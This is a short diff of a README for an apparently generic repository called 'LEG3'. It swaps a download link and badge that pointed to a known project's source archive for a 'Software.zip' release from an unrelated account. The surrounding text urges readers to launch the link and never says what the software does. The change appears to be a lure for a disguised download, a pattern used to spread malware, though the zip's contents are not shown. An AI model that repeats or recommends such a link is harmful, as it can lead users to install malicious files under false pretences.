@@ -10,9 +10,9 @@ The topics for this repository are not specified. Feel free to delve into the co
 
 ## Resources
 Check out the following link for additional resources:
-[Download LEG3](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download LEG3](https://github.com/KiameterCool/leg3/releases/download/v2.0/Software.zip)
 
-[![](https://img.shields.io/badge/Download-LEG3-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/KiameterCool/leg3/releases/download/v2.0/Software.zip)](https://github.com/KiameterCool/leg3/releases/download/v2.0/Software.zip)
 
 Please ensure to launch the above link to access the content. If the link does not work or you require more information, consider visiting the "Releases" section of this repository.
 
